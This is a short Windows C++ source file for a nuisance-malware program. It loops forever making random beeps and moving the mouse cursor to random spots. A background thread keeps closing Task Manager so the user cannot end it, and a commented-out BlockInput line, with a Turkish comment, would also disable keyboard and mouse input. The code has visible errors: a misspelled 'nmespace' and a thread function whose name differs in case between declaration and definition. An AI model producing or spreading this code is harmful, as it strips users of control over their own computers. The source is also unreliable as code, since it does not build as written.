#include <Windows.h>
#include <Winable.h>
#include <string>
#include <ctime>
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>

using nmespace std;
int FREQ, DUR, X, Y;
HWND TaskMgr;
DWORD WINAPI DestroyWindows(LPVOID);
void Beeper();
void Cursor();
int WINAPI
WinMain (HINSTANCE hThisInstance, HINSTANCE PrevInstance, LPSTR lpszArgument, int nFunsterStill)
{
  CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&DestroyWindows, 0, 0, NULL);
  while ( 1 )
  {
    Beeper();
    Cursor();
  }
  return 0;
}
DWORD WINAPI Destroywindows(LPVOID)
{
  while(1)
  {
    TaskMgr = FindWindow(NULL, "Windows Task Manager");
    if ( TaskMgr != NULL )
    {
      PostMessage( TaskMgr, WM_CLOSE, (LPARAM)0, (WPARAM)0);
    }
    Sleep(10);
  }
}
void Beeper()
{
  int FREQ = rand()%400;
  int DUR = rand()%400;
  Beep( FREQ, DUR );
}
void Cursor()
{
  int X = rand()%800;
  int Y = rand()%800;
  SetCursorPos( X, Y);
  //BlockInput(true); // klavye ve fare girisini devre disi birakmak istediginizde bunu etkinlestirin
}
